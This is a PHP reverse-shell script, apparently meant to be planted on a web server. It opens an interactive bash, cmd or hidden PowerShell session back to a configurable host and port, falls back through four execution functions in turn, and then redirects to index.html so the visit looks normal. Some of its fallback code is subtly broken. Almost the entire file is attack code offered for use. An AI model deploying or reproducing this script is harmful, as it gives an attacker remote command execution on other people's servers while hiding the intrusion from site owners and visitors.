<?php
/**
 * Remote Access Script (PHP Version)
 * This script establishes a reverse shell connection back to a specified host and port.
 */

// Configuration
$remote_host = "127.0.0.1";  // Replace with your actual IP address
$remote_port = 4444;        // Replace with your desired port

// Function to establish connection
function establish_connection($host, $port) {
    // Disable output buffering
    @ob_end_clean();
    
    // Attempt connection using different methods
    
    // Method 1: Using proc_open
    if (function_exists('proc_open')) {
        // For Windows
        if (strtolower(substr(PHP_OS, 0, 3)) === 'win') {
            $cmd = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"\\$client = New-Object System.Net.Sockets.TCPClient('$host',$port);\$stream = \\$client.GetStream();[byte[]]\\$bytes = 0..65535|%%{0};while((\\$i = \\$stream.Read(\\$bytes, 0, \\$bytes.Length)) -ne 0){;\\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\$bytes,0, \\$i);\\$sendback = (iex \\$data 2>&1 | Out-String );\\$sendback2 = \\$sendback + 'PS ' + (pwd).Path + '> ';\\$sendbyte = ([text.encoding]::ASCII).GetBytes(\\$sendback2);\\$stream.Write(\\$sendbyte,0,\\$sendbyte.Length);\\$stream.Flush()};\\$client.Close()\"";
        } else {
            // For Unix/Linux/Mac
            $cmd = "/bin/bash -i";
            $descriptorspec = array(
                0 => array("pipe", "r"),
                1 => array("pipe", "w"),
                2 => array("pipe", "w")
            );
            $process = proc_open($cmd, $descriptorspec, $pipes);
            
            if (is_resource($process)) {
                // Open connection
                $sock = fsockopen($host, $port, $errno, $errstr, 30);
                if ($sock) {
                    while (($line = fgets($pipes[1])) !== false) {
                        fwrite($sock, $line);
                    }
                    while (($line = fgets($pipes[2])) !== false) {
                        fwrite($sock, $line);
                    }
                    while (($line = fgets($sock)) !== false) {
                        fwrite($pipes[0], $line);
                    }
                    fclose($sock);
                    proc_close($process);
                    return true;
                }
                proc_close($process);
            }
        }
    }
    
    // Method 2: Using fsockopen and system
    if (function_exists('fsockopen') && function_exists('system')) {
        $sock = fsockopen($host, $port, $errno, $errstr, 30);
        if ($sock) {
            $descriptorspec = array(
                0 => $sock,
                1 => $sock,
                2 => $sock
            );
            if (strtolower(substr(PHP_OS, 0, 3)) === 'win') {
                system("cmd.exe", $descriptorspec);
            } else {
                system("/bin/bash -i", $descriptorspec);
            }
            fclose($sock);
            return true;
        }
    }
    
    // Method 3: Using exec
    if (function_exists('exec')) {
        if (strtolower(substr(PHP_OS, 0, 3)) === 'win') {
            $cmd = "powershell -WindowStyle Hidden -Command \"\\$client = New-Object System.Net.Sockets.TCPClient('$host',$port);\$stream = \\$client.GetStream();[byte[]]\\$bytes = 0..65535|%%{0};while((\\$i = \\$stream.Read(\\$bytes, 0, \\$bytes.Length)) -ne 0){;\\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\$bytes,0, \\$i);\\$sendback = (iex \\$data 2>&1 | Out-String );\\$sendback2 = \\$sendback + 'PS ' + (pwd).Path + '> ';\\$sendbyte = ([text.encoding]::ASCII).GetBytes(\\$sendback2);\\$stream.Write(\\$sendbyte,0,\\$sendbyte.Length);\\$stream.Flush()};\\$client.Close()\"";
        } else {
            $cmd = "php -r '\$sock=fsockopen(\"$host\",$port);exec(\"/bin/bash -i <&3 >&3 2>&3\");'";
        }
        exec($cmd);
        return true;
    }
    
    // Method 4: Using shell_exec
    if (function_exists('shell_exec')) {
        if (strtolower(substr(PHP_OS, 0, 3)) === 'win') {
            $cmd = "powershell -WindowStyle Hidden -Command \"\\$client = New-Object System.Net.Sockets.TCPClient('$host',$port);\$stream = \\$client.GetStream();[byte[]]\\$bytes = 0..65535|%%{0};while((\\$i = \\$stream.Read(\\$bytes, 0, \\$bytes.Length)) -ne 0){;\\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\$bytes,0, \\$i);\\$sendback = (iex \\$data 2>&1 | Out-String );\\$sendback2 = \\$sendback + 'PS ' + (pwd).Path + '> ';\\$sendbyte = ([text.encoding]::ASCII).GetBytes(\\$sendback2);\\$stream.Write(\\$sendbyte,0,\\$sendbyte.Length);\\$stream.Flush()};\\$client.Close()\"";
        } else {
            $cmd = "php -r '\$sock=fsockopen(\"$host\",$port);exec(\"/bin/bash -i <&3 >&3 2>&3\");'";
        }
        shell_exec($cmd);
        return true;
    }
    
    return false;
}

// Main execution - only run if accessed directly
if (basename(__FILE__) == basename($_SERVER['SCRIPT_NAME'])) {
    // Attempt to establish connection
    establish_connection($remote_host, $remote_port);
    
    // If we reach here, redirect to a legitimate-looking page
    header("Location: index.html");
    exit(0);
}
?>